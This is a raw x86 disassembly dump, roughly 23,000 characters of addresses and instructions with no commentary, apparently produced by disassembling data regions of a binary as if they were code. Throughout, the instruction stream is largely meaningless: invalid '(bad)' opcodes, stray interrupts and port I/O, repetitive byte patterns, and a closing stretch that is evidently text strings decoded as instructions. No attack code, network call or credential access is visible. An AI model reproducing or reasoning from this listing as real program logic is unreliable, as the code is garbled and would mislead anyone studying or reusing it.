  4279e8:	mov    BYTE PTR [ebx-0xf],al
  4279eb:	das    
  4279ec:	add    eax,0x80808142
  4279f1:	adc    bh,bh
  4279f3:	out    0x37,al
  4279f5:	ficom  WORD PTR [ebx]
  4279f7:	in     al,dx
  4279f8:	iret   
  4279f9:	int    0x96
  4279fb:	mov    ch,cl
  4279fd:	(bad)  
  4279fe:	dec    esp
  4279ff:	int    0xe6
  427a01:	mov    ch,cl
  427a03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a04:	dec    esp
  427a05:	cmp    edx,DWORD PTR [ecx]
  427a07:	cmp    esp,ebx
  427a09:	das    
  427a0a:	inc    ebp
  427a0b:	sti    
  427a0c:	xchg   edx,eax
  427a0d:	shr    ecx,cl
  427a0f:	sub    BYTE PTR [edx],dl
  427a11:	clc    
  427a12:	add    BYTE PTR [eax-0x102c9380],0x92
  427a19:	cmp    ebx,ebp
  427a1b:	push   ebx
  427a1c:	clc    
  427a1d:	int    0xe6
  427a1f:	mov    BYTE PTR [ebx-0x2b],dl
  427a22:	int    0xa6
  427a24:	dec    esp
  427a25:	xchg   ecx,ebx
  427a27:	sbb    esi,esp
  427a29:	or     dl,BYTE PTR [esi+0x4cd60a88]
  427a2f:	int    0x96
  427a31:	mov    ch,cl
  427a33:	(bad)  
  427a34:	dec    esp
  427a35:	int    0xe6
  427a37:	mov    ch,cl
  427a39:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a3a:	dec    esp
  427a3b:	cmp    edx,DWORD PTR [ecx]
  427a3d:	cmp    esp,ebx
  427a3f:	das    
  427a40:	inc    ebp
  427a41:	sti    
  427a42:	xchg   edx,eax
  427a43:	shr    ecx,cl
  427a45:	sub    BYTE PTR [ebx],bh
  427a47:	fst    st(3)
  427a49:	out    dx,eax
  427a4a:	xchg   edx,eax
  427a4b:	adc    bh,al
  427a4d:	add    BYTE PTR [eax-0x2aac9380],0x53
  427a54:	clc    
  427a55:	ds xchg esi,eax
  427a57:	xor    BYTE PTR [esi],bl
  427a59:	(bad)  
  427a5a:	adc    al,0xcd
  427a5c:	xchg   esi,eax
  427a5d:	cmp    al,0xcd
  427a5f:	(bad)  
  427a60:	inc    esp
  427a61:	int    0x96
  427a63:	xor    ch,cl
  427a65:	(bad)  
  427a66:	adc    al,0xcd
  427a68:	xchg   esi,eax
  427a69:	xor    ch,cl
  427a6b:	(bad)  
  427a6c:	adc    al,0xcd
  427a6e:	out    0x30,al
  427a70:	int    0xa6
  427a72:	adc    al,0x3b
  427a74:	adc    DWORD PTR [ebx],edi
  427a76:	jecxz  0x427aa7
  427a78:	inc    ebp
  427a79:	sti    
  427a7a:	xchg   edx,eax
  427a7b:	shr    ecx,cl
  427a7d:	sub    BYTE PTR [ebx],bh
  427a7f:	fst    QWORD PTR [edx]
  427a81:	clc    
  427a82:	add    BYTE PTR [eax-0x102c9380],0x92
  427a89:	push   ebx
  427a8a:	clc    
  427a8b:	int    0xe6
  427a8d:	cmp    al,0x53
  427a8f:	aad    0xcd
  427a91:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a92:	inc    esp
  427a93:	cmp    edi,edx
  427a95:	cmp    ebx,DWORD PTR [ebp-0x32c38933]
  427a9b:	lea    eax,[edi+ebp*1+0x45]
  427a9f:	loope  0x427a33
  427aa1:	cmp    ecx,ebx
  427aa3:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427aa9:	sub    BYTE PTR [ebx+edx*2-0x6],0xcd
  427aae:	lea    esi,[eax]
  427ab0:	shr    esp,cl
  427ab2:	xchg   edx,eax
  427ab3:	push   ebx
  427ab4:	popf   
  427ab5:	xchg   ecx,ebx
  427ab7:	int    0x96
  427ab9:	adc    al,0x1b
  427abb:	hlt    
  427abc:	add    al,0xf2
  427abe:	std    
  427abf:	shr    edi,cl
  427ac1:	sub    BYTE PTR [ebx],bh
  427ac3:	ins    DWORD PTR es:[edi],dx
  427ac4:	adc    al,BYTE PTR [edx]
  427ac6:	aam    0x37
  427ac8:	ficom  WORD PTR [ebx]
  427aca:	adc    bh,bl
  427acc:	mov    ebp,0xcd25230a
  427ad1:	out    0x3c,al
  427ad3:	int    0xa6
  427ad5:	inc    esp
  427ad6:	add    al,0xe9
  427ad8:	std    
  427ad9:	adc    bh,al
  427adb:	aam    0x37
  427add:	ficom  WORD PTR [ebx]
  427adf:	adc    dh,ah
  427ae1:	mov    ebp,0x8725230a
  427ae6:	lock int 0xe6
  427ae9:	and    al,0x1b
  427aeb:	aad    0x53
  427aed:	rcl    BYTE PTR [esi-0x43],cl
  427af0:	or     ah,BYTE PTR [ebx]
  427af2:	and    eax,0x12025370
  427af7:	not    esi
  427af9:	aaa    
  427afa:	ficom  WORD PTR [ebx]
  427afc:	cwde   
  427afd:	add    dh,dl
  427aff:	xor    al,0x0
  427b01:	(bad)  
  427b02:	sub    al,0x9a
  427b04:	add    dh,dl
  427b06:	sbb    al,0x0
  427b08:	(bad)  
  427b09:	adc    al,0x0
  427b0b:	(bad)  
  427b0c:	xor    BYTE PTR [eax],al
  427b0e:	(bad)  
  427b0f:	dec    esp
  427b10:	add    dh,dl
  427b12:	mov    BYTE PTR [ebp+0xfef4],bh
  427b18:	or     cl,BYTE PTR [ebx-0x57557433]
  427b1e:	arpl   bx,cx
  427b20:	sar    BYTE PTR [eax+eax*4],cl
  427b23:	int    0x96
  427b25:	mov    ch,cl
  427b27:	(bad)  
  427b28:	dec    esp
  427b29:	int    0xe6
  427b2b:	mov    ch,cl
  427b2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b2e:	dec    esp
  427b2f:	cmp    esp,ebx
  427b31:	cmp    edx,DWORD PTR [ecx]
  427b33:	das    
  427b34:	inc    ebp
  427b35:	sti    
  427b36:	xchg   edx,eax
  427b37:	shr    ecx,cl
  427b39:	sub    BYTE PTR [edx],dl
  427b3b:	clc    
  427b3c:	add    BYTE PTR [eax-0x102c9380],0x92
  427b43:	cmp    ebx,ebp
  427b45:	push   ebx
  427b46:	aad    0x53
  427b48:	clc    
  427b49:	int    0xe6
  427b4b:	xor    ch,cl
  427b4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b4e:	adc    al,0x53
  427b50:	fst    DWORD PTR [ebx-0xc]
  427b53:	or     dl,BYTE PTR [esi+0x14d60a30]
  427b59:	int    0x96
  427b5b:	cmp    al,0xcd
  427b5d:	(bad)  
  427b5e:	inc    esp
  427b5f:	int    0x96
  427b61:	xor    ch,cl
  427b63:	(bad)  
  427b64:	adc    al,0xcd
  427b66:	xchg   esi,eax
  427b67:	mov    ch,cl
  427b69:	(bad)  
  427b6a:	dec    esp
  427b6b:	int    0x96
  427b6d:	mov    ch,cl
  427b6f:	(bad)  
  427b70:	dec    esp
  427b71:	int    0xe6
  427b73:	mov    ch,cl
  427b75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b76:	dec    esp
  427b77:	cmp    esp,ebx
  427b79:	cmp    edx,DWORD PTR [ecx]
  427b7b:	das    
  427b7c:	inc    ebp
  427b7d:	sti    
  427b7e:	xchg   edx,eax
  427b7f:	shr    ecx,cl
  427b81:	sub    BYTE PTR [edx],dl
  427b83:	clc    
  427b84:	add    BYTE PTR [eax-0x22c49380],0x53
  427b8b:	aad    0xd3
  427b8d:	out    dx,eax
  427b8e:	xchg   edx,eax
  427b8f:	push   ebx
  427b90:	clc    
  427b91:	int    0xe6
  427b93:	xor    ch,cl
  427b95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b96:	adc    al,0x3b
  427b98:	cli    
  427b99:	cmp    ebx,DWORD PTR [ebp-0x32cf8933]
  427b9f:	lea    edx,[edi+ebp*1]
  427ba2:	inc    ebp
  427ba3:	loope  0x427b37
  427ba5:	cmp    ecx,ebx
  427ba7:	push   ebx
  427ba8:	cli    
  427ba9:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427baf:	sub    BYTE PTR [ebx+edx*8-0x14],0x92
  427bb4:	push   ebx
  427bb5:	popf   
  427bb6:	int    0x76
  427bb8:	cmp    al,0xcd
  427bba:	lea    eax,[edi+eax*4-0x27]
  427bbe:	int    0xe6
  427bc0:	cmp    al,0x1b
  427bc2:	hlt    
  427bc3:	int    0xa6
  427bc5:	inc    esp
  427bc6:	adc    al,BYTE PTR [edx]
  427bc8:	mov    ebp,0x5625230a
  427bcd:	jnp    0x427c06
  427bcf:	ficom  WORD PTR [ebx]
  427bd1:	das    
  427bd2:	inc    ebp
  427bd3:	jge    0x427b67
  427bd5:	shr    ecx,cl
  427bd7:	sub    bl,dl
  427bd9:	jmp    0x427b6d
  427bdb:	cmp    ebx,ebp
  427bdd:	adc    bh,al
  427bdf:	add    BYTE PTR [eax-0xfac9380],0x53
  427be6:	lds    eax,FWORD PTR [edi-0x32fde40f]
  427bec:	lea    ecx,[eax-0x32b36933]
  427bf2:	out    0x30,al
  427bf4:	int    0xa6
  427bf6:	adc    al,0x4
  427bf8:	repnz std 
  427bfa:	add    al,0xe9
  427bfc:	std    
  427bfd:	adc    al,BYTE PTR [edx]
  427bff:	aam    0x37
  427c01:	ficom  WORD PTR [ebx]
  427c03:	adc    bh,al
  427c05:	aam    0x37
  427c07:	ficom  WORD PTR [ebx]
  427c09:	shr    edi,cl
  427c0b:	sub    BYTE PTR [ebx],bh
  427c0d:	ins    DWORD PTR es:[edi],dx
  427c0e:	adc    bh,bl
  427c10:	mov    ebp,0x1225230a
  427c15:	hlt    
  427c16:	mov    ebp,0x8725230a
  427c1b:	lock sbb edx,ebp
  427c1e:	jmp    0x427c67
  427c20:	inc    DWORD PTR [eax]
  427c22:	add    BYTE PTR [esi-0x12fb1233],dl
  427c28:	sbb    al,0x98
  427c2a:	pop    edi
  427c2b:	(bad)  
  427c2c:	aaa    
  427c2d:	ficom  WORD PTR [ebx]
  427c2f:	or     cl,BYTE PTR [ebp+0xabd5d11]
  427c35:	and    esp,DWORD PTR ds:0xc9f5760a
  427c3b:	jbe    0x427bfa
  427c3d:	xchg   ecx,eax
  427c3e:	aaa    
  427c3f:	ficom  WORD PTR [ebx]
  427c41:	or     dh,BYTE PTR [esi-0x13]
  427c44:	int    0x96
  427c46:	adc    ebp,ecx
  427c48:	(bad)  
  427c49:	cmc    
  427c4a:	call   0xefd3:0x92fb452f
  427c51:	xchg   edx,eax
  427c52:	int    0xd6
  427c54:	adc    ebp,ecx
  427c56:	out    0xf5,al
  427c58:	jo     0x427c6c
  427c5a:	sti    
  427c5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427c5c:	mov    esi,0x3b4229
  427c61:	jno    0x427cb6
  427c63:	(bad)  [edx]
  427c65:	xchg   esi,eax
  427c66:	std    
  427c67:	int    0x96
  427c69:	dec    esp
  427c6a:	or     dl,BYTE PTR [esi+0x4cd6004c]
  427c70:	iret   
  427c71:	jbe    0x427c70
  427c73:	add    dh,dl
  427c75:	mov    bl,dl
  427c77:	mov    ecx,0xd6007028
  427c7c:	dec    esp
  427c7d:	add    dh,dl
  427c7f:	in     eax,dx
  427c80:	add    dh,dl
  427c82:	mov    ebp,0xf5d600
  427c87:	(bad)  
  427c88:	adc    DWORD PTR [ebp+0xfde6],edi
  427c8e:	stos   BYTE PTR es:[edi],al
  427c8f:	or     dh,BYTE PTR [esi-0x3]
  427c92:	int    0x76
  427c94:	std    
  427c95:	test   al,0xcb
  427c97:	ror    BYTE PTR [eax-0x12326980],cl
  427c9d:	add    al,0xb5
  427c9f:	stc    
  427ca0:	add    al,0xed
  427ca2:	inc    esp
  427ca3:	cwde   
  427ca4:	leave  
  427ca5:	je     0x427cdb
  427ca7:	xor    al,0x80
  427ca9:	add    BYTE PTR [eax+0x3474c980],0x44
  427cb0:	add    BYTE PTR [eax+0x74cf8080],0x34
  427cb7:	xor    BYTE PTR [eax+0x0],dh
  427cba:	(bad)  
  427cbb:	xor    al,0x0
  427cbd:	(bad)  
  427cbe:	sub    al,0x0
  427cc0:	(bad)  
  427cc1:	and    al,0x0
  427cc3:	(bad)  
  427cc4:	sbb    al,0x0
  427cc6:	(bad)  
  427cc7:	adc    al,0x0
  427cc9:	(bad)  
  427cca:	xor    BYTE PTR [eax],al
  427ccc:	(bad)  
  427ccd:	dec    esp
  427cce:	add    dh,dl
  427cd0:	mov    BYTE PTR [ebp+0xe7e7],bh
  427cd6:	int    0x76
  427cd8:	mov    BYTE PTR [edx],cl
  427cda:	je     0x427d10
  427cdc:	test   ch,cl
  427cde:	je     0x427d14
  427ce0:	xor    al,0x6
  427ce2:	ins    DWORD PTR es:[edi],dx
  427ce3:	das    
  427ce4:	add    eax,0x80808017
  427ce9:	int    0x74
  427ceb:	xor    al,0x44
  427ced:	push   es
  427cee:	ins    DWORD PTR es:[edi],dx
  427cef:	das    
  427cf0:	add    eax,0x8080800a
  427cf5:	add    ah,dl
  427cf7:	xor    al,0x24
  427cf9:	add    ah,dl
  427cfb:	xor    al,0x24
  427cfd:	add    ah,dl
  427cff:	xor    al,0x24
  427d01:	int    0x74
  427d03:	xor    al,0x50
  427d05:	add    cl,dh
  427d07:	int    0x74
  427d09:	xor    al,0x84
  427d0b:	int    0x74
  427d0d:	xor    al,0x84
  427d0f:	int    0x74
  427d11:	xor    al,0x84
  427d13:	iret   
  427d14:	jbe    0x427c9a
  427d16:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427d1a:	int    0x74
  427d1c:	xor    al,0x3c
  427d1e:	xchg   DWORD PTR [esp+esi*1-0x7c],esi
  427d22:	or     dh,BYTE PTR [esp+esi*1-0x7c]
  427d26:	int    0x74
  427d28:	xor    al,0x84
  427d2a:	int    0x74
  427d2c:	xor    al,0x84
  427d2e:	int    0x8c
  427d30:	xor    al,0x84
  427d32:	int    0xa
  427d34:	and    eax,0xcd808081
  427d39:	xor    ebp,ecx
  427d3b:	aam    0x34
  427d3d:	mov    ch,cl
  427d3f:	add    DWORD PTR ds:0x5e808081,ebp
  427d45:	sbb    BYTE PTR [edi],ch
  427d47:	or     edx,DWORD PTR ds:0xcd808081
  427d4d:	xor    ch,cl
  427d4f:	push   eax
  427d50:	int    0x62
  427d52:	fs iret 
  427d54:	xchg   esp,eax
  427d55:	sbb    BYTE PTR [eax-0x33],dh
  427d58:	push   ecx
  427d59:	int    0x22
  427d5b:	xchg   DWORD PTR [ecx-0x77cb2b33],ebx
  427d61:	pop    esi
  427d62:	sbb    BYTE PTR [edi],ch
  427d64:	add    al,0x7b
  427d66:	add    DWORD PTR [eax+0x3494cd80],0xcd51cd88
  427d70:	dec    edx
  427d71:	int    0x80
  427d73:	xor    ecx,DWORD PTR [edi]
  427d75:	xchg   ebx,edx
  427d77:	or     dl,BYTE PTR [edx-0x7f7e8d15]
  427d7d:	or     ch,0x74
  427d80:	xor    al,0x44
  427d82:	push   es
  427d83:	ins    DWORD PTR es:[edi],dx
  427d84:	das    
  427d85:	push   es
  427d86:	cwde   
  427d87:	add    DWORD PTR [eax+0x3474cd80],0x2d01cd84
  427d91:	add    DWORD PTR [eax+0xa80cd80],0xcd4c3474
  427d9b:	je     0x427dd1
  427d9d:	test   ch,cl
  427d9f:	add    DWORD PTR ds:0xcd808081,esp
  427da5:	or     BYTE PTR [edx],0x74
  427da8:	xor    al,0x4c
  427daa:	int    0x74
  427dac:	xor    al,0x84
  427dae:	int    0x1
  427db0:	or     DWORD PTR [ecx-0x7f327f80],eax
  427db6:	int    0x80
  427db8:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427dbc:	int    0x74
  427dbe:	xor    al,0x84
  427dc0:	int    0x1
  427dc2:	int3   
  427dc3:	add    DWORD PTR [eax-0x327f3280],0x34740a80
  427dcd:	dec    esp
  427dce:	int    0x74
  427dd0:	xor    al,0x84
  427dd2:	int    0x8c
  427dd4:	xor    al,0x84
  427dd6:	int    0x1
  427dd8:	popf   
  427dd9:	add    DWORD PTR [eax-0x62f53280],0xcd808081
  427de3:	or     ch,0x89
  427de6:	imul   edx,ecx,0x3b358621
  427dec:	jns    0x427df2
  427dee:	add    bh,bh
  427df0:	sar    DWORD PTR [ebp+0x28f2d392],cl
  427df6:	push   ebx
  427df7:	jge    0x427e03
  427df9:	mov    WORD PTR [esp+ecx*2],?
  427dfc:	leave  
  427dfd:	je     0x427e33
  427dff:	mov    BYTE PTR [eax-0x327f7f80],al
  427e05:	je     0x427e3b
  427e07:	xor    al,0x6
  427e09:	ins    DWORD PTR es:[edi],dx
  427e0a:	aam    0x73
  427e0c:	int    0x74
  427e0e:	xor    al,0x30
  427e10:	add    al,0xbd
  427e12:	adc    ah,0x52
  427e15:	jl     0x427deb
  427e17:	cmp    edi,DWORD PTR [esp+edi*2-0x2c]
  427e1b:	and    edi,DWORD PTR [esi+edx*8+0x52]
  427e1f:	add    ah,dl
  427e21:	xor    al,0x2c
  427e23:	add    ah,dl
  427e25:	xor    al,0x2c
  427e27:	add    ah,dl
  427e29:	xor    al,0x2c
  427e2b:	add    ah,dl
  427e2d:	xor    al,0x2c
  427e2f:	int    0x74
  427e31:	xor    al,0x54
  427e33:	add    cl,dh
  427e35:	in     al,dx
  427e36:	cmp    BYTE PTR [eax],al
  427e38:	aam    0x34
  427e3a:	and    al,0x0
  427e3c:	aam    0x34
  427e3e:	and    al,0x0
  427e40:	aam    0x34
  427e42:	and    al,0xcd
  427e44:	je     0x427e7a
  427e46:	push   eax
  427e47:	add    cl,dh
  427e49:	in     al,dx
  427e4a:	and    al,BYTE PTR [eax]
  427e4c:	aam    0x34
  427e4e:	adc    al,0xcd
  427e50:	je     0x427e86
  427e52:	cmp    al,0x0
  427e54:	icebp  
  427e55:	in     al,dx
  427e56:	xchg   ch,cl
  427e58:	je     0x427e8e
  427e5a:	xor    al,0x0
  427e5c:	icebp  
  427e5d:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427e61:	int    0x74
  427e63:	xor    al,0x4c
  427e65:	push   es
  427e66:	ins    DWORD PTR es:[edi],dx
  427e67:	aam    0x4e
  427e69:	int    0x74
  427e6b:	xor    al,0x84
  427e6d:	leave  
  427e6e:	add    DWORD PTR [ebp+0x41808081],ebp
  427e74:	and    DWORD PTR [esi+0x3474cd35],eax
  427e7a:	mov    ch,cl
  427e7c:	mov    WORD PTR [esp+eax*4],?
  427e7f:	int    0xa
  427e81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e82:	add    DWORD PTR [eax-0x367ef580],0x49883474
  427e8c:	and    DWORD PTR [esi+0x3474cd35],eax
  427e92:	mov    ch,cl
  427e94:	mov    WORD PTR [eax+ecx*4],?
  427e97:	cmp    edi,DWORD PTR [ecx+0x4]
  427e9a:	add    bh,bh
  427e9c:	shl    edx,cl
  427e9e:	sub    bl,dl
  427ea0:	mov    ebp,0xcdd35392
  427ea5:	mov    WORD PTR [esp+ecx*2],?
  427ea8:	inc    ebx
  427ea9:	rcl    esi,cl
  427eab:	and    ecx,ebp
  427ead:	je     0x427ee3
  427eaf:	test   ch,cl
  427eb1:	mov    WORD PTR [esp+eax*4],?
  427eb4:	int    0xa
  427eb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427eb7:	add    DWORD PTR [eax-0x32aeff80],0x80811101
  427ec1:	add    BYTE PTR [eax],0x70
  427ec4:	cmp    al,0xec
  427ec6:	push   ds
  427ec7:	iret   
  427ec8:	jbe    0x427e4e
  427eca:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427ece:	int    0x74
  427ed0:	xor    al,0x4c
  427ed2:	int    0x8c
  427ed4:	xor    al,0x84
  427ed6:	int    0xa
  427ed8:	in     al,0x81
  427eda:	add    BYTE PTR [eax-0x777e7633],0xcd
  427ee1:	je     0x427f17
  427ee3:	test   ch,cl
  427ee5:	add    ebp,ebp
  427ee7:	add    DWORD PTR [eax-0x3277ff80],0xcd84348c
  427ef1:	or     bh,BYTE PTR [ebp-0x327f7f7f]
  427ef7:	or     bh,0x84
  427efa:	adc    cl,ch
  427efc:	mov    WORD PTR [esp+eax*4],?
  427eff:	int    0xa
  427f01:	in     al,0x81
  427f03:	add    BYTE PTR [eax-0x76327f33],0x81
  427f0a:	mov    BYTE PTR [eax-0x2d591833],ch
  427f10:	sub    al,0x80
  427f12:	lds    edx,FWORD PTR [eax+0x75]
  427f15:	ins    BYTE PTR es:[edi],dx
  427f16:	jae    0x427f8f
  427f18:	bound  ebp,QWORD PTR gs:[edi+0x6c]
  427f1c:	bound  esp,QWORD PTR fs:[ebp+0x64]
  427f20:	add    BYTE PTR [ecx+0x74],ah
  427f23:	ins    BYTE PTR es:[edi],dx
  427f24:	popa   
  427f25:	inc    esp
  427f26:	gs popa 
  427f28:	fs push 0x6561686d
  427f2e:	add    BYTE PTR fs:[ebp+0x74],ah
  427f32:	push   0x65726143
  427f37:	outs   dx,DWORD PTR ds:[esi]
  427f38:	jns    0x427fa0
  427f3a:	add    BYTE PTR gs:[edi+0x72],dh
  427f3e:	jns    0x427fad
  427f40:	popa   
  427f41:	outs   dx,DWORD PTR ds:[esi]
  427f42:	bound  ebp,QWORD PTR gs:[ecx+0x74]
  427f46:	add    BYTE PTR [edi+ebp*2+0x73],dh
  427f4a:	push   0x6f6d6568
  427f4f:	add    BYTE PTR fs:[edx+0x65],dl
  427f53:	arpl   WORD PTR [ebx+0x62],si
  427f56:	popa   
  427f57:	ins    BYTE PTR es:[edi],dx
  427f58:	jne    0x427fd2
  427f5a:	gs jae 0x427f5d
  427f5d:	ins    DWORD PTR es:[edi],dx
  427f5e:	imul   edi,DWORD PTR [eax+0x50],0x64726569
  427f65:	outs   dx,DWORD PTR ds:[esi]
  427f66:	jb     0x427fd7
  427f68:	jo     0x427f6a
  427f6a:	ja     0x427fcd
  427f6c:	gs je  0x427fde
  427f6f:	jb     0x427fe0
  427f71:	bound  esp,QWORD PTR [ecx+0x70]
  427f74:	add    BYTE PTR [ebx+0x69],cl
  427f77:	outs   dx,BYTE PTR ds:[esi]
  427f78:	addr16 addr16 popa 
  427f7b:	outs   dx,BYTE PTR ds:[esi]
  427f7c:	arpl   WORD PTR [ecx+0x70],sp
  427f7f:	add    BYTE PTR [edi+0x6e],al
  427f82:	jne    0x427ff7
  427f84:	je     0x427feb
  427f86:	outs   dx,BYTE PTR ds:[esi]
  427f87:	push   esi
  427f88:	popa   
  427f89:	jb     0x428004
  427f8b:	add    BYTE PTR [ebx+esi*2+0x61],dl
  427f8f:	jb     0x427fe1
  427f91:	popa   
  427f92:	ins    BYTE PTR es:[edi],dx
  427f93:	ins    DWORD PTR es:[edi],dx
  427f94:	je     0x427fff
  427f96:	outs   dx,DWORD PTR ds:[esi]
  427f97:	ja     0x427ffe
  427f99:	jb     0x427f9b
  427f9b:	jo     0x428002
  427f9d:	ins    DWORD PTR es:[edi],dx
  427f9e:	jns    0x428014
  427fa0:	push   0x6f656562
  427fa5:	outs   dx,BYTE PTR ds:[esi]
  427fa6:	push   eax
  427fa7:	imul   esi,DWORD PTR [eax+0x79],0x786f6200
  427fae:	inc    ebx
  427faf:	outs   dx,DWORD PTR ds:[esi]
  427fb0:	popa   
  427fb1:	ins    BYTE PTR es:[edi],dx
  427fb2:	popa   
  427fb3:	imul   ebp,DWORD PTR [eax+0x65],0x656573
  427fba:	je     0x428035
  427fbc:	outs   dx,DWORD PTR gs:[esi]
  427fbe:	outs   dx,BYTE PTR ds:[esi]
  427fbf:	gs ins BYTE PTR es:[edi],dx
  427fc1:	inc    ebx
  427fc2:	push   0x54007261
  427fc7:	jns    0x428039
  427fc9:	jns    0x428038
  427fcb:	jne    0x428032
  427fcd:	imul   eax,DWORD PTR gs:[eax],0x70
  427fd1:	outs   dx,DWORD PTR ds:[esi]
  427fd2:	je     0x428016
  427fd4:	gs gs jb 0x428048
  427fd8:	outs   dx,DWORD PTR ds:[esi]
  427fd9:	je     0x428046
  427fdb:	imul   eax,DWORD PTR [eax],0x616c7548
  427fe1:	jo     0x42804c
  427fe3:	popa   
  427fe4:	ins    BYTE PTR es:[edi],dx
  427fe5:	dec    ebx
  427fe6:	outs   dx,BYTE PTR ds:[esi]
  427fe7:	popa   
  427fe8:	jo     0x428063
  427fea:	add    BYTE PTR gs:[eax+0x6f],dh
  427fee:	je     0x428032
  427ff0:	gs ins BYTE PTR es:[edi],dx
  427ff2:	jae    0x428063
  427ff4:	js     0x427ff6
  427ff6:	popa   
  427ff7:	data16 je 0x428040
  427ffa:	ins    BYTE PTR es:[edi],dx
  427ffb:	popa   
  427ffc:	imul   esp,DWORD PTR [ebp+0x78],0x70
  428000:	gs jae 0x428064
  428003:	jb     0x428005
  428005:	inc    edx
  428006:	ins    BYTE PTR es:[edi],dx
  428007:	popa   
  428008:	bound  eax,QWORD PTR [ecx+ebp*2+0x6e]
  42800c:	je     0x428074
  42800e:	ins    BYTE PTR es:[edi],dx
  42800f:	jns    0x428086
  428011:	push   0x6d6d6800
  428016:	popa   
  428017:	inc    edi
  428018:	popa   
  428019:	ins    BYTE PTR es:[edi],dx
  42801a:	ins    BYTE PTR es:[edi],dx
  42801b:	push   0x48007361
  428020:	outs   dx,DWORD PTR ds:[esi]
  428021:	ins    DWORD PTR es:[edi],dx
  428022:	outs   dx,DWORD PTR gs:[esi]
  428024:	jb     0x42808b
  428026:	data16 jno 0x428092
  428029:	jae    0x42808c
  42802b:	bound  esi,QWORD PTR [eax+0x61]
  42802e:	add    BYTE PTR [ebp+0x74],ah
  428031:	outs   dx,BYTE PTR ds:[esi]
  428032:	gs addr16 jbe 0x428097
  428036:	je     0x4280b1
  428038:	gs popa 
  42803a:	add    BYTE PTR [ebp+0x67],ah
  42803d:	outs   dx,DWORD PTR ds:[esi]
  42803e:	inc    edi
  42803f:	popa   
  428040:	imul   esi,DWORD PTR [ecx+eiz*2+0x72],0x6f00656f
  428048:	jo     0x4280af
  42804a:	fs jbe 0x4280ae
  42804d:	je     0x4280c4
  42804f:	imul   ebp,DWORD PTR [ecx+0x66],0x62
  428053:	outs   dx,DWORD PTR ds:[esi]
  428054:	add    BYTE PTR [edx+0x0],ch
  428057:	jne    0x428059
  428059:	add    BYTE PTR [bp+0x0],ch
  42805d:	popa   
  42805e:	add    BYTE PTR [esi+0x0],ch
  428061:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  428066:	add    BYTE PTR [ebp+0x0],dh
  428069:	ins    DWORD PTR es:[edi],dx
  42806a:	add    BYTE PTR [eax],al
  42806c:	add    BYTE PTR [edi+0x0],ch
  42806f:	jb     0x428071
  428071:	ja     0x428073
  428073:	imul   eax,DWORD PTR [eax],0x680073
  428079:	outs   dx,BYTE PTR ds:[esi]
  42807a:	add    BYTE PTR [ecx+0x0],ch
  42807d:	add    BYTE PTR fs:[ecx+0x0],ch
  428081:	ja     0x428083
  428083:	imul   eax,DWORD PTR [eax],0x65006e
  428089:	push   0x70000000
  42808e:	add    BYTE PTR [ecx+0x0],ah
  428091:	je     0x428093
  428093:	jbe    0x428095
  428095:	add    BYTE PTR gs:[ebp+0x0],ah
  428099:	je     0x42809b
  42809b:	add    BYTE PTR gs:[edi+0x0],ah
  42809f:	ins    BYTE PTR es:[edi],dx
  4280a0:	add    BYTE PTR [ecx+0x0],ah
  4280a3:	imul   eax,DWORD PTR [eax],0x66
  4280a9:	outs   dx,DWORD PTR ds:[esi]
  4280aa:	add    BYTE PTR [esi+0x0],ch
  4280ad:	je     0x4280af
  4280af:	popa   
  4280b0:	add    BYTE PTR [edi+0x0],dh
  4280b3:	push   ebx
  4280b4:	add    BYTE PTR [edi+0x0],ch
  4280b7:	arpl   WORD PTR [eax],ax
  4280b9:	imul   eax,DWORD PTR [eax],0x61
  4280bc:	add    BYTE PTR [esi+0x0],dh
  4280bf:	outs   dx,DWORD PTR ds:[esi]
  4280c0:	add    BYTE PTR [eax],al
  4280c2:	add    BYTE PTR [ebp+0x0],ch
  4280c5:	jns    0x4280c7
  4280c7:	add    BYTE PTR gs:[esi+0x0],ah
  4280cb:	ins    BYTE PTR es:[edi],dx
  4280cc:	add    BYTE PTR [ecx+0x0],ah
  4280cf:	jns    0x4280d1
  4280d1:	jbe    0x4280d3
  4280d3:	popa   
  4280d4:	add    BYTE PTR [esi+0x0],ch
  4280d7:	popa   
  4280d8:	add    BYTE PTR [edi+0x0],ah
  4280db:	outs   dx,DWORD PTR ds:[esi]
  4280dc:	add    BYTE PTR [eax],al
  4280de:	add    BYTE PTR [edi+0x0],ch
  4280e1:	jb     0x4280e3
  4280e3:	jae    0x4280e5
  4280e5:	imul   eax,DWORD PTR [eax],0x47006e
  4280eb:	imul   eax,DWORD PTR [eax],0x70006d
  4280f1:	bound  eax,QWORD PTR [eax]
  4280f3:	outs   dx,DWORD PTR ds:[esi]
  4280f4:	add    BYTE PTR [eax+0x0],dh
  4280f7:	imul   eax,DWORD PTR [eax],0x650000
  4280fd:	js     0x4280ff
  4280ff:	jae    0x428101
  428101:	outs   dx,DWORD PTR ds:[esi]
  428102:	add    BYTE PTR [ebx+0x0],dh
  428105:	popa   
  428106:	add    BYTE PTR [esi+0x0],ch
  428109:	je     0x42810b
  42810b:	add    BYTE PTR [eax],al
  42810d:	bound  eax,QWORD PTR [eax]
  42810f:	jns    0x428111
  428111:	add    BYTE PTR gs:[eax+eax*1+0x61],ch
  428116:	add    BYTE PTR [eax+eax*1+0x74],ah
  42811a:	add    BYTE PTR [ecx+0x0],ah
  42811d:	add    BYTE PTR [eax],al
  42811f:	js     0x428121
  428121:	imul   eax,DWORD PTR [eax],0x610054
  428127:	imul   eax,DWORD PTR [eax],0x48006e
  42812d:	popa   
  42812e:	add    BYTE PTR [esi+0x0],ch
  428131:	add    BYTE PTR fs:[eax],al
  428134:	add    BYTE PTR [edi+0x0],cl
  428137:	ja     0x428139
